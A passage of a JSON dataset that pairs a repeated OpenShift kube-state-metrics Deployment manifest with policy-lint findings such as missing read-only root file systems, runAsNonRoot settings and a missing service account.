- --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy-main\" does not have a read-only root file system"
  },
  {
    "id": "9529",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy-self\" does not have a read-only root file system"
  },
  {
    "id": "9530",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-state-metrics\" does not have a read-only root file system"
  },
  {
    "id": "9531",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-state-metrics\" not found"
  },
  {
    "id": "9532",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-rbac-proxy-main\" is not set to runAsNonRoot"
  },
  {
    "id": "9533",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-rbac-proxy-self\" is not set to runAsNonRoot"
  },
  {
    "id": "9534",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 80Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /tmp\n          name: volume-directive-shadow\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --client-ca-file=/etc/tls/client/client-ca.crt\n        image: quay.io/brancz/kube-rbac-proxy:v0.9.0\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 15Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: kube-state-metrics-tls\n          readOnly: false\n        - mountPath: /etc/tls/client\n          name: metrics-client-ca\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: kube-state-metrics\n      volumes:\n      - emptyDir: {}\n        name: volume-directive-shadow\n      - name: kube-state-metrics-tls\n        secret:\n          secretName: kube-state-metrics-tls\n      - configMap:\n          name: metrics-client-ca\n        name: metrics-client-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-state-metrics\" is not set to runAsNonRoot"
  },
  {
    "id": "9535",
    "manifest_path": "data/manifests/the_stack_sample/sample_3630.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: exporter\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: exporter\n      app.kubernetes.io/name: kube-state-metrics\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: kube-state-metrics\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: exporter\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        - --metric-denylist=kube_secret_labels\n        - --metric-labels-allowlist=pods=[*],node=[*]\n        - '--metric-denylist=\n\n          kube_.+_created,\n\n          kube_.+_metadata_resource_version,\n\n          kube_replicaset_metadata_generation,\n\n          kube_replicaset_status_observed_generation,\n\n          kube_pod_restart_policy,\n\n          kube_pod_init_container_status_terminated,\n\n          kube_pod_init_container_status_running,\n\n          kube_pod_container_status_terminated,\n\n          kube_pod_container_status_running,\n\n          kube_pod_completion_time,\n\n          kube_pod_status_scheduled\n\n          '\n        image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        name: kube-state-metrics\n        resources:\n          requests:\n            cpu: 2m\n            memory: 